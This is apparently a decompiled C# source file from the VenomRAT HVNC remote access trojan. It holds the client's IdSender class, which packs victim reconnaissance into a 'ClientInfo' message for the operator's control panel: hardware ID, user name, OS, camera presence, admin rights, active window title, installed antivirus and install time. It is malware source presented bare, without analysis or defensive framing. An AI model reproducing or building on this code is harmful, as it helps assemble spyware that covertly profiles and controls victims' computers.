// Decompiled with JetBrains decompiler
// Type: Client.Helper.IdSender
// Assembly: Client, Version=5.0.0.3, Culture=neutral, PublicKeyToken=null
// MVID: AF1838BC-6B25-40E4-9339-7F493AC3654D
// Assembly location: C:\Users\Younn\RiderProjects\VenomRAT_HVNC-5.0.4.0\VenomRAT_HVNC\bin\Debug\Client.exe

using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;


namespace Client.Helper
{
  public static class IdSender
  {
    public static byte[] SendInfo()
    {
      MsgPack msgPack1 = new MsgPack();
      msgPack1.ForcePathObject("Pac_ket").AsString = "ClientInfo";
      msgPack1.ForcePathObject("HWID").AsString = Settings.hwId;
      msgPack1.ForcePathObject("User").AsString = Environment.UserName.ToString();
      msgPack1.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", (string) null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
      msgPack1.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
      msgPack1.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
      msgPack1.ForcePathObject("Version").AsString = Settings.verSion;
      msgPack1.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
      msgPack1.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
      msgPack1.ForcePathObject("Paste_bin").AsString = Settings.pasteBin;
      msgPack1.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
      MsgPack msgPack2 = msgPack1.ForcePathObject("Install_ed");
      DateTime dateTime = new FileInfo(Application.ExecutablePath).LastWriteTime;
      dateTime = dateTime.ToUniversalTime();
      string str = dateTime.ToString();
      msgPack2.AsString = str;
      msgPack1.ForcePathObject("Po_ng").AsString = "";
      msgPack1.ForcePathObject("Group").AsString = Settings.Group;
      return msgPack1.Encode2Bytes();
    }
  }
}
